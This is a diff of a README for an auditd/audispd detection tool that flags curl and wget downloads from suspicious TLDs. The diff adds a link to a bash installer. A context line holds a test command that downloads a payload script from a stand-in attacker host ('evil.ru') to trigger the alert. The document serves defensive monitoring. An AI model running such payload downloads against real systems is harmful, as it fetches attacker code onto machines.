@@ -158,6 +158,15 @@ You should see something like:
 wget http://evil.ru:8000/payload.sh -O /tmp/payload2.sh
 journalctl -u auditd --since "2 minutes ago" | grep 'AUDIT-ALERT' -i
 ```
+## bash installer for an audispd plugin
+
+**Bash installer (audispd plugin + rules)**
+
+- ```install_audisp_curl_wget_tld.sh```
+<br>→ Installs a lightweight audispd plugin that flags curl/wget URLs with suspicious TLDs, drops the auditd rules, and restarts auditd. Also supports --uninstall.
+
+- https://github.com/tskinnerarlo/Bridging-Host-and-Network/blob/main/Suspicious_File_Downloads/install_audisp_curl_wget_tld.sh
+
 ## Notes & tuning
 
 - TLD list: Update tld_re in the plugin to your intel (start narrow).
